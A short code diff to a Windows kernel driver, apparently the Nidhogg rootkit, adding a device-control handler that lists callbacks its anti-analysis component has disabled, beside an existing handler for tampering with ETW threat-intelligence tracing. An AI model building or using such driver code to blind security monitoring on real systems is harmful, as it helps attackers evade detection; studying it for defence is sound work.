@@ -1099,6 +1099,25 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		break;
 	}
 
+	case IOCTL_LIST_DISABLED_CALLBACKS:
+	{
+		const SIZE_T headerSize = FIELD_OFFSET(IoctlDisabledCallbackList, Callbacks);
+		if (inputSize != 0 || outputSize < headerSize) {
+			status = STATUS_INVALID_BUFFER_SIZE;
+			break;
+		}
+
+		auto data = static_cast<IoctlDisabledCallbackList*>(Irp->AssociatedIrp.SystemBuffer);
+		if (!data) {
+			status = STATUS_INVALID_PARAMETER;
+			break;
+		}
+
+		const SIZE_T capacity = (outputSize - headerSize) / sizeof(IoctlDisabledCallbackEntry);
+		status = NidhoggAntiAnalysisHandler->ListDisabledCallbacks(data, capacity, &len);
+		break;
+	}
+
 	case IOCTL_ENABLE_DISABLE_ETWTI:
 	{
 		if (!Features.EtwTiTamper) {
